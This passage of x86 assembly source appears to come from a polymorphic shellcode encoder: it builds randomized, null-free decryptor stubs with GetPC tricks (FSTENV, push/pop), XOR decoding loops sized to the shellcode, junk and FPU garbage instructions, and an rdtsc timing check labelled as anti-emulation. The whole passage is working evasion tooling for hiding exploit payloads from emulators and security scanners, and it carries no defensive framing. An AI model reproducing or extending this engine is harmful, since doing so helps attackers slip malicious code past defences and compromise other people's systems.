		mov	dword ptr [garbage_start],edi
		cmp	byte ptr [no_garbage],1
		je	garbage_fly_end

		mov	eax,7
		call	random_eax
		test	eax,eax
		jnz	garbage_fly_end		; no garbage

		mov	eax,2			; up to 5 instuctions
		call	random_eax		; !!!!!!!!!!!
		test	eax,eax
		jz	garbage_fly_end		; no garbage this time


		mov	ecx,eax

garbage_fly_gen:
		mov	eax,2
		call	random_eax
		test	eax,eax
		jz	garbage_fly_copro	; copro garbage


		;;	normal instructions
		cmp	byte ptr [do_normal],1
		je	garbage_fly_gen

		call	get_big_num
		mov	edx,dword ptr [i_operand]		; PRESERVE!!!!!
		mov	dword ptr [i_operand],eax


		mov	eax,normal_garbage__variants_size + 1
		call	random_eax

		lea	esi,normal_garbage_vtbl
		call	seek_to_variant	

		lodsb
		call	seek_and_store_i
					
		mov	dword ptr [i_operand],edx
		loop	garbage_fly_gen


;copro_2byte_garbage

garbage_fly_end:
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret

garbage_fly_copro:
		cmp	byte ptr [copro_init_flag],0
		jne	garbage_fly_copro2
		call	copro_garbage_init
	
garbage_fly_copro2:
		mov	eax,10
		call	random_eax
		cmp	eax,1
		jne	garbage_fly_copro3
		call	copro_garbage_init


garbage_fly_copro3:
		lea	esi,copro_2byte_garbage
		mov	eax,copro_2byte_garbage_size
		call	random_eax
		push	ecx
		mov	ecx,2
		mul	ecx
		pop	ecx
		add	esi,eax
		lodsw
		stosw
		mov	al,2
		call	add_map		
		dec	ecx		
		jnz	garbage_fly_gen
		jmp	garbage_fly_end



; ---------------------------------------------------------------------
; generates compare instructions
; ---------------------------------------------------------------------

gen_compare:
		pushad

		lea	eax,map_block9
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0	

		mov	al,byte ptr [block1_reg]
		mov	ah,al
		call	set_reg

		
		;;  lets get the variant we want to use now
		mov	eax,give_cmpREG_variants_size + 1
		call	random_eax

		lea	esi,give_cmpREG_vtbl
		call	seek_to_variant		

		mov	ebx,1
		mov	byte ptr [i_operand],10h

		mov	byte ptr [do_normal],1
gen_compare_i:	lodsb
		cmp	al,END_TR
		je	gen_compare_end
		
		mov	ecx,edi
		call	seek_and_store_i
		jmp	gen_compare_i	
		
gen_compare_end:
		;mov	byte ptr [do_normal],0		

		
		mov	edx,dword ptr [where_loop]
		sub	edx,edi
		;mov	byte ptr [edi-1],dl		
		mov	byte ptr [ecx+1],dl


		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret




; ---------------------------------------------------------------------
; generates three instructions:
; inc reg6  *  O_ILE1
; inc reg4  *  O_ILE2, sometimes O_ILE2 maybe null :))
; dec reg1  *  O_ILE1
; in random order replacment (the situation is problematic because we 
; can't use ADDs here since we must avoid NULLS) :|
; --------------------------------------------------------------------

gen_add_regs:
		pushad

		lea	eax,map_block8
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0	

		mov	al,byte ptr [o_ile1]
		movzx	ecx,al


fill_inc1:	mov	al,byte ptr [block6_reg]
		call	set_reg
		mov	al,p_inc_reg
		call	seek_and_store_i
		

		mov	al,byte ptr [edi-1]
		mov	byte ptr [mut1_byte],al

		mov	al,byte ptr [block1_reg]
		call	set_reg
		mov	al,p_dec_reg
		call	seek_and_store_i
		loop	fill_inc1

		mov	al,byte ptr [block4_reg]
		mov	ah,al
		call	set_reg

		mov	eax,5
		call	random_eax			; possible non INC REG4 existance
		mov	al,4

		mov	byte ptr [o_ile2],al
		test	eax,eax
		jz	gen_add_regs_end
		

		mov	al,byte ptr [o_ile2]
		movzx	ecx,al
		
fill_inc2:	mov	al,p_inc_reg
		call	seek_and_store_i
		mov	al,byte ptr [edi-1]
		mov	byte ptr [mut2_byte],al
		loop	fill_inc2
				

gen_add_regs_end:
		;call	garbage_fly			; garbage here!!!!!!!!!!!!!!
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret
		
	
				





; ---------------------------------------------------------------------
; generates xor dword ptr [reg1+reg2],reg3
; reg1 - block3_reg :: eip
; reg2 - block5_reg
; ---------------------------------------------------------------------

gen_xor_regs:  	pushad


		lea	eax,map_block7
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0	

		;;	set source reg
		mov	al,byte ptr [block5_reg]
		mov	ah,al
		call 	set_reg

		mov	al,p_xor_dword_2reg
		mov	byte ptr [no_garbage],1
		call	seek_and_store_i
		mov	byte ptr [no_garbage],0


		mov	al,byte ptr [block3_reg]
		mov	al,byte ptr [x1_table[eax]]
		mov	dl,8h			
		and	dl,0F8h	
		or	dl,al			
		
		mov	al,byte ptr [block6_reg]
		mov	al,byte ptr [x2_table[eax]]
		and	dl,0c7h
		or	dl,al
		
		mov	byte ptr [edi],dl		; --- sib ----
		inc	edi
		call	inc_map	
	

		call	garbage_fly
		jmp	gen_mov_regD_end



; ---------------------------------------------------------------------
; inits the counter
; ---------------------------------------------------------------------

gen_zero_counter:
		pushad

		lea	eax,map_block6
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0	

		mov	byte ptr [no_garbage],1
		mov	al,byte ptr [block6_reg]
		mov	ah,al
		call 	set_reg

		mov	ecx,0

		mov	edx,edi
		mov	eax,2
		call	random_eax
		test	eax,eax
		jmp	gen_zero_counter_r
		jz	gen_zero_counter_r		

gen_zero_nullify:
		push 	offset gen_zero_counter_r
		pushad
		jmp	gen_zero_reg_ra

gen_zero_counter_r:
		

		push	offset gen_zero_counter_rr
		pushad
		jmp	gen_movS_reg_ra


gen_zero_counter_rr:
		mov	byte ptr [no_garbage],0
		;call	garbage_fly			; garbage here!!!!!!!!!!!!!!
		jmp	gen_mov_regD_end




temp_zc		db	50 dup (0)




; ---------------------------------------------------------------------
; generates mov reg2,[reg1]
; ---------------------------------------------------------------------

gen_mov_regD:
		pushad

		lea	eax,map_block5
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0	

		mov	eax,2
		call	random_eax
		test	eax,eax
		jz	gen_mov_regD_normal

		push 	offset gen_mov_regD_normal
		pushad
		mov	al,byte ptr [block5_reg]
		mov	ah,al
		call 	set_reg
		jmp	gen_zero_reg_ra

	
gen_mov_regD_normal:
		;;  lets get the variant we want to use now
		mov	eax,give_movREGd_variants_size + 1
		call	random_eax

		lea	esi,give_movREGd_vtbl
		call	seek_to_variant		

		push	eax
		;mov	byte ptr [block4_reg],M0_EBP
		mov	al,byte ptr [block4_reg]		; source reg
		mov	ah,byte ptr [block5_reg]		; dest reg
		call	set_reg
		pop	eax


		;;	variant 0
		cmp	al,0
		je	gen_mov_regD_go0

		;;	variant 1
		cmp	al,1
		je	gen_mov_regD_go1

		;;	variant 2
		cmp	al,2
		je	gen_mov_regD_go2


gen_mov_regD_end:
		;call	garbage_fly			; garbage here!!!!!!!!!!!!!!
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret

gen_mov_regD_go0:
		lodsb
		call	seek_and_store_i
		jmp	gen_mov_regD_end

gen_mov_regD_go1:
		lodsb
		call	seek_and_store_i
		mov	al,byte ptr [block5_reg]
		call	set_reg
		lodsb
		call	seek_and_store_i
		jmp	gen_mov_regD_end

gen_mov_regD_go2:
		push 	offset gen_mov_regD_go2r
		pushad
		mov	al,byte ptr [block5_reg]
		mov	ah,al
		call 	set_reg

		jmp	gen_zero_reg_ra

gen_mov_regD_go2r:
		mov	al,byte ptr [block4_reg]		; source reg
		mov	ah,byte ptr [block5_reg]		; dest reg
		call	set_reg

		lodsb
		call	seek_and_store_i
		jmp	gen_mov_regD_end			






; ---------------------------------------------------------------------
; generates cmp for crypt key
; ---------------------------------------------------------------------

gen_cmp_crypt:
		pushad


		lea	eax,map_block10
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0	


		mov	ah,byte ptr [block4_reg]
		mov	al,ah
		call	set_reg

		
		mov	byte ptr [no_garbage],1
		mov	al,p_cmp_byte_reg_num
		call	seek_and_store_i
		mov	byte ptr [edi-1],0
		mov	dword ptr [compare_byte],edi
		dec	dword ptr [compare_byte]

		
		mov	al,p_jne
		call	seek_and_store_i
		mov	eax,edi
		dec	eax

		mov	byte ptr [no_garbage],0
		mov	edx,edi
		lea	edi,temp_jnz
		call	gen_copy_reg

	
		
		sub	edi,offset temp_jnz
		mov	ecx,edi
		mov	byte ptr [eax],cl
		lea	esi,temp_jnz
		mov	edi,edx
		rep	movsb
		
			



gen_cmp_end:
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret


compare_byte	dd	0		
temp_jnz	db	150 dup (0)





; ---------------------------------------------------------------------
; generates copy regs
; ---------------------------------------------------------------------
; ENTRY: EDI = buffor
gen_copy_reg:
		pushad

		lea	eax,map_block4
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0


		;;	place a xor reg_dest, reg_dest ??
		mov	eax,2
		call	random_eax
		test	eax,eax
		jz	gen_copy_reg_normal
		
		push 	offset gen_copy_reg_normal
		pushad
		mov	al,byte ptr [block4_reg]
		mov	ah,al
		call 	set_reg
		jmp	gen_zero_reg_ra



gen_copy_reg_normal:
		;;  lets get the variant we want to use now
		mov	eax,give_movREG_variants_size + 1
		call	random_eax

		lea	esi,give_movREG_vtbl
		call	seek_to_variant		

		push	eax
		mov	al,byte ptr [block3_reg]		; source reg
		mov	ah,byte ptr [block4_reg]		; dest reg
		call	set_reg
		pop	eax

		;;	Variant 0
		cmp	al,0
		je	gen_movREG_go0
		;;	Variant 1
		cmp	al,1
		je	gen_movREG_go1
		;;	Variant 2
		cmp	al,2
		je	gen_movREG_go2

		

gen_copy_reg_end:
		;call	garbage_fly			; garbage here!!!!!!!!!!!!!!
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret

gen_movREG_go1: ;; generates push reg_src / pop reg_dest
		lodsb
		call	seek_and_store_i
		mov	al,byte ptr [block4_reg]
		call	set_reg
		lodsb
		call	seek_and_store_i
		jmp	gen_copy_reg_end

gen_movREG_go0: ;; generates mov reg_dest / reg_src
		lodsb
		call	seek_and_store_i
		jmp	gen_copy_reg_end


gen_movREG_go2: ;; generates xor reg_dest,reg_dest / add reg_dest/reg_src
		
		push 	offset gen_movREG_go2r
		pushad
		mov	al,byte ptr [block4_reg]
		mov	ah,al
		call 	set_reg

		jmp	gen_zero_reg_ra

gen_movREG_go2r:
		mov	al,byte ptr [block3_reg]		; source reg
		mov	ah,byte ptr [block4_reg]		; dest reg
		call	set_reg

		lodsb
		call	seek_and_store_i
		jmp	gen_copy_reg_end	
				

		 




; ---------------------------------------------------------------------
; generates anti emulatore code -> on cpu time based decryption
; ---------------------------------------------------------------------
; ENTRY: EDI = buffor
gen_anti_emul:
		pushad

		mov	word ptr [edi],310Fh		; place rdtsc
		add	edi,2
		mov	al,2
		;call	add_map

		mov	eax,2
		call	random_eax
		test	eax,eax
		jz	gen_anti_emul_preEAX

		;;	now store getEIP instructions
		call	gen_getEIP

		;;	and store mov not_used_reg,eax
		lea	eax,antiemul_map
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0
		call	gen_anti_emul_place
		jmp	gen_anti_emul_end
				
		
		
gen_anti_emul_preEAX:

		lea	eax,antiemul_map
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0
		call	gen_anti_emul_r
		mov	bl,al

		mov	eax,p_mov_reg_eax		; mov reg,eax
		call	seek_and_store_i
		
		call	gen_getEIP
		
		mov	al,bl
		mov	ah,al
		call	set_reg

		push	offset gen_anti_emul_end
		pushad
		jmp	gen_anti_emul_pE

		


gen_anti_emul_end:
		;call	garbage_fly			; garbage here!!!!!!!!!!!!!!
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret


gen_anti_emul_r:
		mov	eax,x1_tbl_size - 2
		call	random_eax
		add	eax,3
		lea	esi,reg_table
		add	esi,eax
		lodsb
		cmp	al,M0_EDX
		je	gen_anti_emul_r
		mov	ah,al
		call	set_reg
		ret


gen_anti_emul_place:
		pushad

		call	gen_anti_emul_r

		mov	eax,p_mov_reg_eax		; mov reg,eax
		call	seek_and_store_i


gen_anti_emul_pE:
		mov	word ptr [edi],310Fh		; place rdtsc
		add	edi,2
		mov	al,2
		call	add_map

		mov	eax,p_sub_eax_reg		; sub eax,reg
		call	seek_and_store_i

		mov	word ptr [edi],0c032h		; xor al,al
		add	edi,2
		mov	al,2
		call	add_map

		
		mov	al,byte ptr [block3_reg]
		mov	ah,al
		call	set_reg

		mov	word ptr [edi],0e432h
		add	edi,2
		mov	al,2
		call	add_map

		mov	eax,p_add_reg_eax
		call	seek_and_store_i		

		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret





; ---------------------------------------------------------------------
; generates GET_EIP instructions
; ---------------------------------------------------------------------
; ENTRY: EDI = buffor

gen_getEIP:	pushad
		
		lea	eax,map_block3
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0

		;;  lets get the variant we want to use now

		mov	eax,give_getEIP_variants_size + 1
		call	random_eax
		;mov	eax,0
		
		lea	esi,give_getEIP_vtbl
		call	seek_to_variant		

		;;	set destination register 
		push	eax
		movzx	eax,byte ptr [block3_reg]
		mov	ah,al
		call	set_reg	 		
		pop	eax

		call	set_st_regs
		call	set_getEIP_operand		

		xor	edx,edx
		mov	ebx,1

		;;	variant 0
		cmp	eax,0
		je	gen_getEIP_go0

		;;	variant 3
		cmp	eax,3
		je	gen_getEIP_go3

		;;	variant 4
		cmp	eax,4
		je	gen_getEIP_go4
		

		;;	variant 1,2
gen_getEIP_i:	lodsb
		cmp	al,END_TR
		je	gen_getEIP_end
		
		call	seek_and_store_i
		jmp	gen_getEIP_i		
		






gen_getEIP_end:
		
		cmp	eax,edi
		jle	put_eax
		mov	edi,eax

put_eax:
		mov	eax,dword ptr [garbage_start]
		mov	dword ptr [where_call_reg],eax	;edi
		sub	dword ptr [where_call_reg],2
		;call	garbage_fly			; garbage here!!!!!!!!!!!!!!
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret


gen_getEIP_go4:	lodsb
		call	seek_and_store_i
	

gen_getEIP_go3:	lodsb
		call	seek_and_store_i

		mov	byte ptr [edi],08dh
		mov	al,byte ptr [scan_lea_byte]
		mov	byte ptr [edi+1],al
		mov	byte ptr [edi+2],24h
		add	edi,3
		mov	al,3
		call	add_map

		lodsb
		call	seek_and_store_i
		jmp	gen_getEIP_end
		

gen_getEIP_go0:

		mov	word ptr [edi],0eed9h		; FLDZ
		add	edi,2
		mov	al,2
		call	add_map

		mov	dword ptr [edi],0f42474d9h	; FSTENV (28-BYTE) PTR SS:[ESP-C]
		add 	edi,4
		mov	al,4
		call	add_map

		lodsb
		call	seek_and_store_i
		mov	byte ptr [was_fldz],5+2
		jmp	gen_getEIP_end


set_getEIP_operand:
		pushad
		mov	eax,(getEIP_stack_table_size)/4
		call	random_eax
		mov	ecx,4
		mul	ecx

		lea	esi,getEIP_stack_table
		add	esi,eax
		lodsd
		mov	dword ptr [i_operand],eax

		popad
		ret



getEIP_stack_table:

		dd	0C324048bh		; (04-modrm) mov reg,[esp] / ret
		dd	0C3905058h		; (50-push reg)(58-pop reg)
		dd	0BBC35058h		; (BB-random)(50-push reg)(58-pop reg)
		dd	0e0FF5890h		; (58-pop reg)(0e0FF-jmp reg 0e-modrm)

getEIP_stack_table_size	equ ($-offset getEIP_stack_table)



		;;	search for 50h / 58h and change the registers (NO MODRM)
		;;	search for 04h / 0Eh and change the registers (MODRM present)
		;;	search for BBh and set random byte there

set_st_regs:
		pushad
		lea	esi,getEIP_stack_table
		mov	ecx,getEIP_stack_table_size	

		mov	eax,x1_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x1_table[eax]]


		push	eax		

		;;	generate reg
		mov	dl,58h
		and	dl,0F8h
		or	dl,al
		mov	bl,dl		; BL = generated reg for 58h - pop reg

		mov	dl,50h
		and 	dl,0F8h
		or	dl,al		; DL = generated reg for 50h - push reg

		dec	esi


		;;	stage first - no modrm attack + random byte store

scan_l1:	inc	esi
		cmp	byte ptr [esi],58h
		je	scan_set_pop_reg
		cmp	byte ptr [esi],50h
		je	scan_set_push_reg
		cmp	byte ptr [esi],0BBh	; random?
		jne	scan_ll

		call	get_big_num
		mov	byte ptr [esi],al
		jmp	scan_ll

scan_set_push_reg:
		mov	byte ptr [esi],dl
		jmp	scan_ll		
scan_set_pop_reg:
		mov	byte ptr [esi],bl
scan_ll:	loop	scan_l1


		pop	eax

		push	eax
		mov	eax,x2_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x2_table[eax]]
		mov	dl,04h			
		and	dl,0C7h	
		or	dl,al			
		mov	bl,dl			; BL = modrm for 04h
		mov	byte ptr [scan_lea_byte],bl
		pop	eax


		mov	dl,0e0h
		and	dl,0F8h	
		or	dl,al			; AL = modrm for 0eh

		lea	esi,getEIP_stack_table
		mov	ecx,getEIP_stack_table_size	


scan_l2:	inc	esi
		cmp	byte ptr [esi],04h
		je	scan_set_1
		cmp	byte ptr [esi],0e0h
		jne	scan_lll

		mov	byte ptr [esi],dl
		jmp	scan_lll
scan_set_1:
		mov	byte ptr [esi],bl
scan_lll:	loop	scan_l2

		popad
		ret

scan_lea_byte	db	0



; ---------------------------------------------------------------------
; generates mov reg32/reg16,shellcode_size
; ---------------------------------------------------------------------
; ENTRY: EDI = buffor

gen_movS_reg:	pushad
		
		lea	eax,map_block2
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0

		;;	potencial copro init
		mov	eax,2
		call	random_eax
		test	eax,eax
		jz	dont_setup_copro
		call	copro_garbage_init
dont_setup_copro:	

		;;	set destination register 
		push	eax
		movzx	eax,byte ptr [block2_reg]
		mov	ah,al
		call	set_reg	 		
		pop	eax


		;;  lets get the variant we want to use now

gen_movS_reg_ra:
	
		cmp	byte ptr [stage2],1			; only for second one
		jne	gen_movSss
		mov	al,byte ptr [stage_rnd]
		jmp	gen_movS_regxxx


gen_movSss:
		mov	eax,give_movS_regs_variants + 1
		call	random_eax


		cmp	byte ptr [block2_option],1
		jne	gen_movS_regxxx
		cmp	al,7
		jl	gen_movS_reg_ra

gen_movS_regxxx:
		cmp	dword ptr [shellcode_size],0FFh
		jg	gen_movS_regx

		
		;;	options (2-6) ex.5 must be executed together with reg xoring


		cmp	al,5
		je	gen_movSSSx
		cmp	al,2
		jl	gen_movSSSx
		cmp	al,6
		jg	gen_movSSSx

		
		push 	offset gen_movSSSx
		pushad
		jmp	gen_zero_reg_ra
gen_movSSSx:


		cmp	al,0
		je	gen_movS_reg_ra
		cmp	al,1
		je	gen_movS_reg_ra
		cmp	al,5
		je	gen_movS_reg_ra



gen_movS_regx:
		lea	esi,give_movS_reg_vtbl
		call	seek_to_variant		

		mov	byte ptr [stage_rnd],al
	

		mov	ebx,1	
		;;	variant 0
		cmp	eax,0
		je	gen_zmovS_go0
		;;	variant 1
		cmp	eax,1
		je	gen_zmovS_go1
		;;	variant 2
		cmp	eax,2
		je	gen_zmovS_go2
		;;	variant 3
		cmp	eax,3
		je	gen_zmovS_go3
		;;	variant 4
		cmp	eax,4
		je	gen_zmovS_go4
		;;	variant 5
		cmp	eax,5
		je	gen_zmovS_go5
		;;	variant 6
		cmp	eax,6
		je	gen_zmovS_go6
		;;	variant 7
		cmp	eax,7
		je	gen_zmovS_go7
		;;	variant 8
		cmp	eax,8
		je	gen_zmovS_go8
		;;	variant 9
		cmp	eax,9
		je	gen_zmovS_go9



gen_movS_end:	
		;call	garbage_fly			; garbage here!!!!!!!!!!!!!!
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret

gen_zmovS_go0:
		mov	byte ptr [edi],066h		; store prefix
		inc	edi
		call	inc_map

		lodsb
		mov	ecx,dword ptr [shellcode_size]
		mov	dword ptr [i_operand],ecx
		call	seek_and_store_i
		jmp	gen_movS_end
		
gen_zmovS_go1:
		mov	byte ptr [edi],066h		; store prefix
		inc	edi
		call	inc_map

		mov	eax,dword ptr [shellcode_size]
		dec	eax
		mov	dword ptr [i_operand],eax
		lodsb		
		call	seek_and_store_i

gen_zmovS_go1x:
		mov	eax,2				; use prefix? (more random)
		call	random_eax
		test	eax,eax
		jnz	gen_zr_go1			; no prefix	

		mov	byte ptr [edi],066h		; store prefix
		call	inc_map
		inc	edi
		jmp	gen_zr_go1
		
gen_zmovS_go2:
		mov	byte ptr [edi],066h		; store prefix
		call	inc_map
		inc	edi

gen_zmovS_go2r:	

		call	get_big_num
		xchg	ecx,eax
		mov	eax,dword ptr [shellcode_size]
		sub	ax,cx
		call	is_good_number
		test	eax,eax
		jz	gen_zmovS_go2r
		
		mov	dword ptr [i_operand],eax
		lodsb
		call	seek_and_store_i


gen_zmovS_go2x:
		mov	byte ptr [edi],066h		; store prefix
		call	inc_map
		inc	edi

		mov	word ptr [i_operand],cx		
		lodsb
		call	seek_and_store_i
		jmp	gen_movS_end		
		
gen_zmovS_go3:		
		mov	byte ptr [edi],066h		; store prefix
		call	inc_map
		inc	edi

		

gen_zmovS_go3r:
		call	get_big_num
		xchg	ecx,eax
		mov	eax,dword ptr [shellcode_size]
		add	ax,cx
		cmp	ax,word ptr [shellcode_size]
		jle	gen_zmovS_go3r

		call	is_good_number
		test	eax,eax
		jz	gen_zmovS_go3r

		mov	dword ptr [i_operand],eax
		lodsb
		call	seek_and_store_i
		jmp	gen_zmovS_go2x

gen_zmovS_go4:
		mov	byte ptr [edi],066h		; store prefix
		call	inc_map
		inc	edi


gen_zmovS_go4r:										
		call	get_big_num
		xchg	ecx,eax
		mov	eax,dword ptr [shellcode_size]					
		xor	ax,cx
		call	is_good_number
		test	eax,eax
		jz	gen_zmovS_go4r

		mov	dword ptr [i_operand],eax
		lodsb
		call	seek_and_store_i
		jmp	gen_zmovS_go2x
				
gen_zmovS_go5:		
		mov	byte ptr [edi],066h		; store prefix
		call	inc_map
		inc	edi
	
		mov	eax,dword ptr [shellcode_size]
		add	eax,2
		mov	dword ptr [i_operand],eax
		lodsb
		call	seek_and_store_i
		jmp	gen_zmovS_go1x
				
gen_zmovS_go6:
		mov	byte ptr [edi],066h		; store prefix
		call	inc_map
		inc	edi

		mov	eax,dword ptr [shellcode_size]
		neg	ax
		mov	dword ptr [i_operand],eax
		lodsb
		call	seek_and_store_i
		
		mov	byte ptr [edi],066h		; store prefix
		call	inc_map
		inc	edi
		lodsb
		call	seek_and_store_i
		jmp	gen_movS_end
			
gen_zmovS_go7:
		call	get_big_num
		mov	ecx,eax
		add	eax,dword ptr [shellcode_size]
		call	is_good_number
		test	eax,eax
		jz	gen_zmovS_go7
		bswap	eax
		call	is_good_number
		jz	gen_zmovS_go7
		bswap	eax
		
		mov	dword ptr [i_operand],eax
		lodsb
		call	seek_and_store_i

		mov	dword ptr [i_operand],ecx
		lodsb
		call	seek_and_store_i
		jmp	gen_movS_end

gen_zmovS_go8:
		call	get_big_num
		mov	ecx,eax
		add	eax,dword ptr [shellcode_size]
		call	is_good_number
		test	eax,eax
		jz	gen_zmovS_go7
		bswap	eax
		call	is_good_number
		jz	gen_zmovS_go7
		bswap	eax
		
		mov	dword ptr [i_operand],eax
		lodsb
		call	seek_and_store_i

		lodsb
		call	seek_and_store_i
		
		mov	dword ptr [i_operand],ecx
		lodsb
		call	seek_and_store_i
		jmp	gen_movS_end	


gen_zmovS_go9:	call	get_big_num
		mov	ecx,eax
		add	eax,dword ptr [shellcode_size]
		call	is_good_number
		test	eax,eax
		jz	gen_zmovS_go7
		bswap	eax
		call	is_good_number
		jz	gen_zmovS_go7

		mov	dword ptr [i_operand],eax
		lodsb
		call	seek_and_store_i
		
		lodsb
		call	seek_and_store_i

		mov	dword ptr [i_operand],ecx
		lodsb
		call	seek_and_store_i
		jmp	gen_movS_end
		
		
		




; ENTRY AX = NUMBER

is_good_number:
		cmp	al,0
		je	bad_num
		cmp	ah,0
		je	bad_num
		ret
bad_num:	xor	eax,eax
		ret
		




; ---------------------------------------------------------------------
; generates mov reg,0
; ---------------------------------------------------------------------
; ENTRY: EDI = buffor

gen_zero_reg:	pushad

		lea	eax,map_block1
		mov	dword ptr [current_map],eax
		mov	byte ptr [current_map_index],0

		;;	potencial copro init
		mov	eax,2
		call	random_eax
		test	eax,eax
		jz	dont_setup_copro2
		call	copro_garbage_init
dont_setup_copro2:


		;;	set destination register 
		push	eax
		movzx	eax,byte ptr [block1_reg]
		mov	ah,al
		call	set_reg	 		
		pop	eax


		;;  lets get the variant we want to use now
gen_zero_reg_ra:
		mov	eax,give_zero_regs_variants + 1
		call	random_eax

		cmp	byte ptr [save_rndX],2
		jne	gen_zero_reg_raXXX
		mov	al,byte ptr [stage_rndX]
		jmp	gen_zero_reg_raXX


gen_zero_reg_raXXX:
		cmp	byte ptr [save_rndX],0
		je	gen_zero_reg_raXX
		mov	byte ptr [stage_rndX],al


gen_zero_reg_raXX:

		lea	esi,give_zero_reg_vtbl
		call	seek_to_variant	

		mov	ebx,1
		xor	edx,edx
	
		;;	variants that don't need any extra calculations		
		cmp	eax,0
		je	gen_zr_go1
		cmp	eax,1
		je	gen_zr_go1
		cmp	eax,7
		je	gen_zr_go1
		cmp	eax,8
		je	gen_zr_go1
		;;	variant	2
		cmp	eax,2
		je	gen_zr_go2
		;;	variant 3
		cmp	eax,3
		je	gen_zr_go3
		;;	variant 4
		cmp	eax,4
		je	gen_zr_go4
		;;	variant 5
		cmp	eax,5
		je	gen_zr_go5
		;;	variant 6
		cmp	eax,6
		je	gen_zr_go6
		;;	variant 9
		cmp	eax,9
		je	gen_zr_go9
	



gen_zero_reg_end:
		;call	garbage_fly			; garbage here!!!!!!!!!!!!!!
		mov	[esp+PUSHA_STRUCT._EDI],edi
		popad
		ret

gen_zr_go9:	;;	generates 9th variant
		call	get_big_num
		mov	ecx,eax
		mov	dword ptr [i_operand],eax

		lodsb
		call	seek_and_store_i
		lodsb
		call	seek_and_store_i

		bswap	ecx
		mov	dword ptr [i_operand],ecx
		jmp	gen_zr_go1_i



gen_zr_go6:	;;	generates 6th variant
		call	get_big_num
		mov	ecx,eax
		mov	dword ptr [i_operand],eax

		lodsb
		call	seek_and_store_i

	
		call	get_big_num
		xor	ecx,eax
		mov	dword ptr [i_operand],eax

		lodsb
		call	seek_and_store_i

		mov	dword ptr [i_operand],ecx
		jmp	gen_zr_go1_i
				
		
gen_zr_go5:	;;	generates 5th variant
		call	get_big_num
		mov	ecx,eax
		mov	dword ptr [i_operand],eax

		lodsb
		call	seek_and_store_i

		add	dword ptr [i_operand],3
		lodsb
		call	seek_and_store_i

		jmp	gen_zr_go1_i
		
gen_zr_go4:	;;	generates 4th variant
		call	get_big_num
		mov	ecx,eax
		mov	dword ptr [i_operand],eax

		lodsb
		call	seek_and_store_i

		call	get_big_num
		neg	eax
		mov	dword ptr [i_operand],eax
		add	ecx,eax

		lodsb
		call	seek_and_store_i
				
		neg	ecx
		mov	dword ptr [i_operand],ecx
		jmp	gen_zr_go1_i
				


gen_zr_go3:	;;	generates 3rd variant
		call	get_big_num
		mov	dword ptr [i_operand],eax

		lodsb
		call	seek_and_store_i

		call	get_big_num
		mov	ecx,dword ptr [i_operand]
		mov	dword ptr [i_operand],eax

		lodsb
		call	seek_and_store_i

		add	dword ptr [i_operand],ecx
		jmp	gen_zr_go1_i				

		
gen_zr_go2:	;;	generates 2nd variant
		call	get_big_num
		neg	eax
		mov	dword ptr [i_operand],eax

		lodsb	
		call	seek_and_store_i

		mov	eax,dword ptr [i_operand]
		neg	eax
		mov	dword ptr [i_operand],eax
		jmp	gen_zr_go1_i
		
				

		

gen_zr_go1:	;; 	generates 0, 1, 7, 8 variants

		call	get_big_num
		mov	dword ptr [i_operand],eax
		

gen_zr_go1_i:	lodsb
		cmp	al,END_TR
		je	gen_zr_go1_end

		call	seek_and_store_i
		jmp	gen_zr_go1_i
		

gen_zr_go1_end:	jmp	gen_zero_reg_end



; ---------------------------------------------------------------------
; generates regs for instructions
; ---------------------------------------------------------------------


gen_regs:	pushad
		lea	edi,reg_table
		xor	ebx,ebx

		mov	eax,x1_tbl_size
		call	random_eax
		stosb
		inc	ebx
		stosb					; second register the same ??
		inc	ebx				; next version we will change it :)


gen_r_again:	lea	esi,reg_table
		mov	eax,x1_tbl_size
		call	random_eax
		
gen_r_rest:	cmp	byte ptr [esi],0FFh
		je	gen_r_done
		cmp	byte ptr [esi],al
		je	gen_r_again
		inc	esi
		jmp	gen_r_rest

gen_r_done:	stosb
		inc	ebx
		cmp	ebx,x1_tbl_size
		jl	gen_r_again
			
		popad
		ret


reg_table:	block1_reg	db	0FFh
		block2_reg	db	0FFh
		block3_reg	db	0FFh
		block4_reg	db	0FFh
		block5_reg	db	0FFh
		block6_reg	db	0FFh
		block7_reg	db	0FFh



; avoids zero occurency in random number
get_big_num:	mov	eax,09999999h
		call	random_eax
		cmp	eax,01111111h
		jl	get_big_num	
		cmp	al,0
		je	get_big_num
		cmp	ah,0
		je	get_big_num
		bswap	eax
		cmp	al,0
		je	get_big_num
		cmp	ah,0
		je	get_big_num
		bswap	eax
		ret
		
		
reset_regs:	pushad
		lea	esi,allowed_regs_mirror
		lea	edi,allowed_regs
		mov	ecx,x1_tbl_size
		rep	movsb
		popad
		ret

; AL = source reg / AH = dest reg
set_reg:	pushad
		mov	ecx,x1_tbl_size
		lea	edi,allowed_regs
		rep	stosb			
		
		mov	ecx,x2_tbl_size
		lea	edi,allowed_regs_d
		xchg	al,ah
		rep	stosb

		popad
		ret





; ----------------------------------------------------------------------
; seeks to selected variant
; ----------------------------------------------------------------------
; AL = number of variant
; ESI = variant table

seek_to_variant:
		pushad
		mov	bl,al
		xor	eax,eax
		mov	al,bl
		xor	ebx,ebx
		

		test	eax,eax
		jz	variant_found

